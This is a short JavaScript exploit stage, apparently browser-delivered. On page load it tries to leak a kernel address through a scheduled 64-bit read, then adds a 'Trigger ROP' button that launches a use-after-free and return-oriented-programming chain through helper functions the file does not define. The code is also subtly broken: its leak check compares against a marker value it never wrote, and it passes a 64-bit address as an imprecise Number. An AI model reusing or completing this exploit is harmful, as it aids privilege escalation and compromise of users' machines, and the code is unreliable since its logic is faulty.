// payload.js

window.read_target = new Uint8Array(8);

function run_payload() {
  debug_log("Payload started. Preparing to leak kernel address...");

  // Fill known marker
  for (let i = 0; i < 8; i++) read_target[i] = 0xAA;

  schedule_read64(0xFFFFFFFF82600000);

  // Start polling immediately
  let tries = 0;
  const view = new DataView(read_target.buffer);
  const interval = setInterval(() => {
    const lo = view.getUint32(0, true);
    const hi = view.getUint32(4, true);
    if (lo !== 0xAAAAAAAA || hi !== 0xBBBBBBBB) {
      const val = (BigInt(hi) << 32n) | BigInt(lo);
      debug_log("✅ read64 result: 0x" + val.toString(16));
      clearInterval(interval);
    }
    if (++tries > 20) {
      debug_log("❌ No leak detected after 4s.");
      clearInterval(interval);
    }
  }, 200);

  // Add button for manual trigger
  const btn = document.createElement("button");
  btn.textContent = "▶️ Trigger ROP";
  btn.style.fontSize = "20px";
  btn.onclick = () => {
    debug_log("🔥 Launching UAF → ROP...");
    triggerUAF();
  };
  document.body.appendChild(btn);
} 

window.onload = run_payload;
